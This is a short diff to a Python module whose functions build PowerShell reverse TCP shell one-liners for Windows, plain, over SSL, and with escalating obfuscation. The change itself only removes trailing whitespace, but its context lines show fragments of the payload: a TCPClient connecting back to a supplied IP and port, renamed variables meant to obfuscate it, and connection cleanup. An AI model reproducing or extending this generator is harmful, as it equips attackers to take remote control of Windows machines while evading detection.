@@ -14,7 +14,7 @@ def make_raw(ip: str, port: int) -> str:
 	Returns the raw PowerShell one-liner (no encoding) for a Windows
 	reverse TCP shell, either plain or over SSL.
 	"""
-	
+
 	payload = (
 		f"$h='{ip}';$p={port};"
 		"$c=New-Object System.Net.Sockets.TCPClient;"
@@ -77,7 +77,7 @@ def generate_windows_powershell_tcp_obfuscate_level1(payload, ip, port):
 	port_literal = str(port)
 
 	# 3) Hand-crafted, static, obfuscated template:
-	
+
 	one_liner = (
 		f"$clf={ip_literal};"
 		f"$prt={port_literal};"
@@ -215,7 +215,7 @@ def generate_windows_powershell_tcp_obfuscate_level3(raw, ip, port):
 
 		# Cleanup
 		"$client.Close();"
-		
+
 		)
 
 	return one_liner
